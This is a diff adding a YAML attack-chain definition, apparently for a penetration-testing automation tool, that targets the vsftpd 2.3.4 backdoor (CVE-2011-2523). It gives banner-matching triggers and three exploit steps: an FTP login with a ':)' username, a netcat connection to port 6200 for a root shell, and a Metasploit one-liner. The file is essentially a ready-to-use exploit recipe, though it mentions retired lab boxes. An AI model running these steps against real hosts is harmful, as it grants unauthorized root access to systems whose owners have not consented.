@@ -1,0 +1,37 @@
+chain_id: vsftpd_2_3_4_backdoor
+title: "vsftpd 2.3.4 — CVE-2011-2523 backdoor (smiley face) → root shell on 6200"
+severity: CRITICAL
+tags: [ftp, vsftpd, cve-2011-2523, backdoor, rce]
+
+trigger:
+  any_of:
+    - { product_pattern: "(?i)vsftpd.*2\\.3\\.4" }
+    - { banner_pattern: "(?i)vsftpd 2\\.3\\.4" }
+
+description: |
+  vsftpd 2.3.4 ships a known backdoor: a username ending in a smiley
+  face (`:)`) opens TCP/6200 with a root shell. Still runs into this
+  on retired HTB/OSCP boxes — confirm the version with the chain
+  trigger then exploit in three lines.
+
+steps:
+  - id: 1
+    title: "Trigger the backdoor"
+    command: |
+      ftp $VICTIMA
+      USER attacker:)
+      PASS whatever
+      QUIT
+
+  - id: 2
+    title: "Connect to the backdoor port"
+    command: nc $VICTIMA 6200
+
+  - id: 3
+    title: "Or use the Metasploit module"
+    command: |
+      msfconsole -qx 'use exploit/unix/ftp/vsftpd_234_backdoor; \
+        set RHOSTS $VICTIMA; run'
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2011-2523
